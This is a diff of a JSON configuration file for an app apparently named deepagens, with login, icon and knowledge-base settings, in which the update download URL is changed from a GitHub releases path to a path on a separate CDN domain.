@@ -3,7 +3,7 @@
   "gatewayProviderName": "deepagens",
   "brandIcon": "/favicon.ico",
   "loginUrl": "https://claw.deepagens.com/api/claw/login",
-  "updateUrl": "https://github.com/gitLongjie/deepseek-harness/releases/latest/download",
+  "updateUrl": "https://geo.cdn.testtool.online/deepagens-claw/setup/",
   "knowledgeBase": {
     "baseUrl": "http://localhost:8080/api/v1",
     "apiKeyEnv": "WEKNORA_API_KEY",
